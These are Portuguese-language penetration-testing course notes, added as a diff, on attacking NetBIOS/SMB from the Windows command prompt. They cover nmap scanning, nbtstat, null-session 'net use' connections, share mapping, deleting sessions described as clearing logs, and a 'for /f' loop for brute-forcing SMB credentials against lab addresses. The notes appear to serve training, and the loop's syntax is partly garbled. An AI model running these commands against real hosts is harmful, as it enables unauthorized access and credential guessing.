@@ -1,0 +1,85 @@
+# Aula 7 Introdução: NetBIOS/SMB
+São responsáveis pelo compartilhamento de arquivos e diretórios
+
+NetBIOS - Network Basic Input Output System | Porta Padrão: 139 (TCP) | Mais antigo
+SMB - Server Message Block | Porta Padrão: 445 (TCP) | Mais recente
+Null Session | Sessão criada sem autenticação de usuário e senha *nulos*
+IPC$ (Inter-Process Comunication) | Permite que usuários anônimos executem determinadas atividades | Oculto por que tem $
+
+# Aula 8 Enumerando NetBIOS/SMB no Windows
+As vezes cai dentro de um ambiente windows por linha de comando e precisa explorar o NetBIOS e SMB
+
+Scan do vídeo: `nmap -v -sV -p139,445 -Pn --open 172.16.1.0/24`
+
+# Comandos
+`nbtstat` -> Mostra estatistícas do protocolo mostrando NetBIOS sobre o TCP/IP
+  `nbtstat -R` -> Limpa o cache
+  `nbtstat -c` -> Mostra todas as máquinas que o sistema já se comunicou
+  `nbtstat -a` -> Busca informações sobre a máquina
+  `nbtstat -A 172.16.1.4` -> Busca informações sobre a máquina mas usando o endereço IP
+
+# Começar a enumerar a máquina
+`net view \\<HOST>` -> Tentar visualizar informações sobre determinadas máquinas
+`net use` -> Interagir com o compartilhamento
+
+# Estabelecendo um Null Session (sem usuário e sem senha)
+`net use \\172.16.1.5 "<Sem_senha>" /u:"<sem_user>" ` -> /:u<USUÁRIO>, para null session, não se deve por nada
+  Se caso der a mensagem **The command completed sucessfully.** é por que o comando foi aceito
+`net view \\172.16.1.5` -> deve mostrar informações sobre o serviço/servidor
+
+# Interagindo com diretórios / compartilhamentos
+Como está no Windows o atacante define uma letra para usar e se conectar, ex: `h`
+`net use h: \\172.16.1.5\<diretório>opt`
+Após fazer isso e der um comando:
+`net use` -> provavelmente irá aparecer o host e a letra que usamos para se comunicar em **"local"** salva e com status **OK**
+Após isso basta dar o comando:
+`h:` -> ou a letra que usamos 
+para testar se está funcionando, ele deve alterar de `C:\` para `H:\`
+`dir` -> deve listar o que possui dentro da pasta
+
+Após isso se estiver só em linha de comando, também é possível continuar a interação, mas se caso tiver em interface gráfica, ele MONTA uma "partição" dentro de "Meu computador" com a letra, exemplo: `H:`
+para deletar a partição:
+`net use h: /delete`
+`net use \\172.16.1.5 /delete` -> exclui a sessão (limpa logs)
+
+Usuário "padrão": `/u:administrator`
+
+# Aula 9 - Trick: Brute Force via prompt do Windows em NetBIOS / SMB (Rever)
+Usando somente o prompt do windows 
+
+Da para fazer isto usando o `for` para ver todos os comandos `for /?`
+
+## Como fazer um Brute force de usuários?
+
+Primeira coisa é criar uma lista:
+- Abrir o `notepad senhas.txt` em senhas.txt, pode ser qualquer nome
+- Ver o conteúdo do arquivo `type senhas.txt`
+
+### Usando o for para usar a lista
+`for /f  %i in (senhas.txt) do <comando que queremos> net use \\172.16.1.4 %i /u:<usuario>`
+
+Agora também automatizando os usuários, dentro do mesmo notepad de senhas.txt, insira os usuarios e senhas assim:
+admin 123456 (separado com espaços dentro do notepad) 
+usuario 987655
+
+`for /f "" %i in (senhas.txt) do net use \\172.16.1.4 %j<qualquer_var> /u:%i`
+
+`"tokens=1,2"` (campo1 & campo2)
+`/f` Opção
+`%i` Variavel que vamos usar "criando a variável"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
